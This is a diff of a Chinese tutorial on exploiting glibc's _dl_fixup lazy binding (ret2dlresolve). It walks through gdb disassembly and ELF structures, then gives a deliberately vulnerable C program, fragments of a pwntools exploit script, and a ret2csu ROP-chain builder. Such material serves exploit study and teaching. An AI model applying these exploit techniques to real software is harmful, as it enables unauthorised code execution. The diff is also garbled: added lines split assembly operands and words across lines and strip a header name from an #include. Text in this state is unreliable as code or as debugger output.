 与0x3进行比较的来源：
-#define STV_PROTECTED	3
-#define ELF32_ST_VISIBILITY(o)	((o) & 0x03)
-#define ELF64_ST_VISIBILITY(o)	ELF32_ST_VISIBILITY (o)
+    #define STV_PROTECTED	3
+    #define ELF32_ST_VISIBILITY(o)	((o) & 0x03)
+    #define ELF64_ST_VISIBILITY(o)	ELF32_ST_VISIBILITY (o)
 
 0x00007ffff7fd7073 <+131>: testb $0x3,0x5(%rax)
 0x00007ffff7fd7077 <+135>: jne 0x7ffff7fd7260 <_dl_fixup+624>
-```
-
-
-
-```
 0x00007ffff7fd707d <+141>: mov 0x208(%rbx),%rdx
 0x00007ffff7fd7084 <+148>: xor %r8d,%r8d
 0x00007ffff7fd7087 <+151>: test %rdx,%rdx
@@ -2019,11 +1833,6 @@ st_info数值对应二进制格式为：0001 0010
 0x00007ffff7fd70af <+191>: test %r10d,%r10d
 0x00007ffff7fd70b2 <+194>: jne 0x7ffff7fd70b7 <_dl_fixup+199>
 0x00007ffff7fd70b4 <+196>: xor %r8d,%r8d
-```
-
-
-
-```
 VERSYM对应的.gnu.version节结构体定义：
 typedef struct
 {
@@ -2035,11 +1844,6 @@ typedef struct
  Elf64_Word	vd_aux; /* Offset in bytes to verdaux array */
  Elf64_Word	vd_next; /* Offset in bytes to next verdef entry */
 } Elf64_Verdef;
-```
-
-
-
-```
 获取的版本信息：
 (gdb) info registers rdx
 rdx 0x3 3
@@ -2048,51 +1852,34 @@ rdx 0x3 3
 Version symbols section '.gnu.version' contains 6 entries:
  Addr: 0x00000000004004ee Offset: 0x000004ee Link: 6 (.dynsym)
  000: 0 (*local*) 2 (GLIBC_2.34) 1 (*global*) 3 (GLIBC_2.2.5)
- 004: 1 (*global*) 1 (*global*) 
+ 004: 1 (*global*) 1 (*global*)
 
 符号对应的版本信息：
-Relocation section '.rela.plt' at offset 0x590 contains 1 entry:
+Relocation section '.rela.plt' at offset 0x590 contains 1 en
+try:
  Offset Info Type Sym. Value Sym. Name + Addend
 000000404000 000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
-```
-
-
-
-```
 (gdb) info registers r8
 r8 0x7ffff7f9c5c8 140737353729480
 (gdb) p *(struct r_found_version*)0x7ffff7f9c5c8
 $36 = {name = 0x400492 "GLIBC_2.2.5", hash = 157882997, hidden = 0, filename = 0x400488 "libc.so.6"}
-```
-
-
-
-```
-0x00007ffff7fd70b7 <+199>: mov %fs:0x18,%ecx
+0x00007ffff7fd70b7 <+199>: mov %fs:
+0x18,%ecx
 0x00007ffff7fd70bf <+207>: mov $0x1,%edx
 0x00007ffff7fd70c4 <+212>: test %ecx,%ecx
 0x00007ffff7fd70c6 <+214>: je 0x7ffff7fd70d9 <_dl_fixup+233>
-0x00007ffff7fd70c8 <+216>: movl $0x1,%fs:0x1c
+0x00007ffff7fd70c8 <+216>: movl $0x1,%fs:
+0x1c
 0x00007ffff7fd70d4 <+228>: mov $0x5,%edx
-```
-
-
-
-```
 p *(tcbhead_t*)$fs_base
-$39 = {tcb = 0x7ffff7da8740, dtv = 0x7ffff7da90e0, self = 0x7ffff7da8740, multiple_threads = 0, gscope_flag = 0, sysinfo = 0, stack_guard = 15852976144659649792, 
- pointer_guard = 7034873935951137108, unused_vgetcpu_cache = {0, 0}, feature_1 = 0, __glibc_unused1 = 0, __private_tm = {0x0, 0x0, 0x0, 0x0}, 
+$39 = {tcb = 0x7ffff7da8740, dtv = 0x7ffff7da90e0, self = 0x7ffff7da8740, multiple_threads = 0, gscope_flag = 0, sysinfo = 0, stack_guard = 15852976144659649792,
+ pointer_guard = 7034873935951137108, unused_vgetcpu_cache = {0, 0}, feature_1 = 0, __glibc_unused1 = 0, __private_tm = {0x0, 0x0, 0x0, 0x0},
  __private_ss = 0x0, ssp_base = 0, __glibc_unused2 = {{{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {
- i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 
- 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 
+ i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0,
+ 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0,
  0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {
- i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}}, __padding = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
+ i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}}, __padding = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
  0x0}}
-```
-
-
-
-```
 0x00007ffff7fd70d9 <+233>: mov 0x3c8(%rbx),%rcx
 0x00007ffff7fd70e0 <+240>: mov (%rax),%eax
 0x00007ffff7fd70e2 <+242>: push $0x0
@@ -2114,34 +1901,20 @@ r8 0x7ffff7f9c5c8 140737353729480
 r9 0x1 1
 (gdb) x /gx $rsp
 0x7fffffffdb60: 0x0000000000000001
-(gdb) 
+(gdb)
 0x7fffffffdb68: 0x0000000000000000
-```
-
-
-
-```
 (gdb) info registers rax
 rax 0x7ffff7f9c000 140737353728000
 (gdb) x /gx 0x7ffff7f9c000
 0x7ffff7f9c000: 0x00007ffff7dab000
 
 7ffff7dab000-7ffff7dcf000 r--p 00000000 08:01 7351314 /usr/lib/libc.so.6
-```
-
-
-
-```
-0x00007ffff7fd7100 <+272>: mov %fs:0x18,%eax
+0x00007ffff7fd7100 <+272>: mov %fs:
+0x18,%eax
 0x00007ffff7fd7108 <+280>: pop %r8
 0x00007ffff7fd710a <+282>: pop %r9
 0x00007ffff7fd710c <+284>: test %eax,%eax
 0x00007ffff7fd710e <+286>: jne 0x7ffff7fd7198 <_dl_fixup+424>
-```
-
-
-
-```
 0x00007ffff7fd7114 <+292>: mov -0x40(%rbp),%rax
 0x00007ffff7fd7118 <+296>: test %rax,%rax
 0x00007ffff7fd711b <+299>: je 0x7ffff7fd71e0 <_dl_fixup+496>
@@ -2149,44 +1922,24 @@ rax 0x7ffff7f9c000 140737353728000
 0x00007ffff7fd7126 <+310>: je 0x7ffff7fd7208 <_dl_fixup+536>
 0x00007ffff7fd712c <+316>: test %r15,%r15
 0x00007ffff7fd712f <+319>: je 0x7ffff7fd7208 <_dl_fixup+536>
-```
-
-
-
-```
 rbp-0x40存储0x7ffff7db1af0，下面通过Elf64_Sym进行解释：
 (gdb) p *(Elf64_Sym*)0x7ffff7db1af0
-$3 = {st_name = 27823, st_info = 34 '"', st_other = 0 ' 00', st_shndx = 15, 
+$3 = {st_name = 27823, st_info = 34 '"', st_other = 0 ' 00', st_shndx = 15,
  st_value = 527328, st_size = 518}
 0x7ffff7dc2c98是libc.so.6中.dynstr节的地址：
 (gdb) x /s 0x7ffff7dc2c98+27823
 0x7ffff7dc9947: "puts"
 
-#define SHN_ABS 0xfff1
-```
-
-
-
-```
+    #define SHN_ABS 0xfff1
 0x00007ffff7fd7135 <+325>: mov (%r15),%rdx
 0x00007ffff7fd7138 <+328>: add 0x8(%rax),%rdx
 0x00007ffff7fd713c <+332>: mov %rdx,-0x38(%rbp)
-```
-
-
-
-```
-#define STT_GNU_IFUNC	10
+    #define STT_GNU_IFUNC	10
 
 0x00007ffff7fd7140 <+336>: movzbl 0x4(%rax),%eax
 0x00007ffff7fd7144 <+340>: and $0xf,%eax
 0x00007ffff7fd7147 <+343>: cmp $0xa,%al
 0x00007ffff7fd7149 <+345>: je 0x7ffff7fd7278 <_dl_fixup+648>
-```
-
-
-
-```
 0x00007ffff7fd714f <+351>: mov 0x378(%rbx),%rax
 0x00007ffff7fd7156 <+358>: test %rax,%rax
 0x00007ffff7fd7159 <+361>: je 0x7ffff7fd71f8 <_dl_fixup+520>
@@ -2196,11 +1949,6 @@ $3 = {st_name = 27823, st_info = 34 '"', st_other = 0 ' 00', st_shndx = 15,
 0x00007ffff7fd716b <+379>: test %eax,%eax
 0x00007ffff7fd716d <+381>: je 0x7ffff7fd7210 <_dl_fixup+544>
 0x00007ffff7fd7173 <+387>: mov (%r12),%rax
-```
-
-
-
-```
 p *(struct rtld_global_ro*)0x7ffff7ffca80
 $19 = {_dl_debug_mask = 0, _dl_platform = 0x7fffffffe439 "x86_64", _dl_platformlen = 6, _dl_pagesize = 4096,
  ......
@@ -2218,11 +1966,6 @@ $19 = {_dl_debug_mask = 0, _dl_platform = 0x7fffffffe439 "x86_64", _dl_platforml
 0x00007ffff7fd718f <+415>: pop %r15
 0x00007ffff7fd7191 <+417>: pop %rbp
 0x00007ffff7fd7192 <+418>: ret
-```
-
-
-
-```
 0x00007ffff7fd7193 <+419>: nopl 0x0(%rax,%rax,1)
 0x00007ffff7fd7198 <+424>: xor %eax,%eax
 ......
@@ -2230,52 +1973,27 @@ $19 = {_dl_debug_mask = 0, _dl_platform = 0x7fffffffe439 "x86_64", _dl_platforml
 0x00007ffff7fd71fc <+524>: jmp 0x7ffff7fd7177 <_dl_fixup+391>
 ......
 0x00007ffff7fd72a1 <+689>: call 0x7ffff7fe1970 <__GI___assert_fail>
-```
-
-
-
-```
 0x0000000000000001 (NEEDED) Shared library: [libc.so.6]
 .....
 0x000000006ffffff0 (VERSYM) 0x4004ee
 0x0000000000000000 (NULL) 0x0
-```
-
-
-
-```
 四
 利用思路
-```
-
-
-
-```
-#define LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)->l_addr : 0)
-#define SYMBOL_ADDRESS(map, ref, map_set) 
- ((ref) == NULL ? 0 
- : (__glibc_unlikely ((ref)->st_shndx == SHN_ABS) ? 0 
+    #define LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)->l_addr : 0)
+    #define SYMBOL_ADDRESS(map, ref, map_set)
+ ((ref) == NULL ? 0
+ : (__glibc_unlikely ((ref)->st_shndx == SHN_ABS) ? 0
  : LOOKUP_VALUE_ADDRESS (map, map_set)) + (ref)->st_value)
 
 value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
-```
-
-
-
-```
 五
 示例讲解
-```
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
+    #include <string.h>
 
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-
-#define MAX_LEN	0x100
+    #define MAX_LEN	0x100
 
 static void vuln(void)
 {
@@ -2294,11 +2012,6 @@ int main(void)
 
  return 0;
 }
-```
-
-
-
-```
 import sys
 import pwn
 
@@ -2825,11 +2538,6 @@ conn = pwn.process(target_info['exec_path'])
 conn.recvuntil('hello worldn')
 pwnfunc()
 conn.interactive()
-```
-
-
-
-```
 ar -x libc_nonshared.a
 
 atexit.oS	at_quick_exit.oS	elf-init.oS	fstat64.oS	fstatat64.oS
@@ -2842,11 +2550,6 @@ Symbol table '.symtab' contains 14 entries:
 ......
  8: 0000000000000000 93 FUNC GLOBAL DEFAULT 1 __libc_csu_init
 ......
-```
-
-
-
-```
 def csu_rop_chain_get(
  r12_arg1, r13_arg2, r14_arg3, r15_call_addr_base,
  rbx_call_addr_append, rbp_val, ret_addr
@@ -2856,20 +2559,10 @@ def csu_rop_chain_get(
  payload += b'E' * (target_info['csu_pop_count'] * target_info['addr_len'])
  payload += pwn.p64(ret_addr)
  return payload
-```
-
-
-
-```
 do_system -> __spawni -> __spawnix
 
 __spawnix:
  __clone_internal (&clone_args, __spawni_child, &args);
-```
-
-
-
-```
 static int
 __spawnix (pid_t * pid, const char *file,
  const posix_spawn_file_actions_t * file_actions,
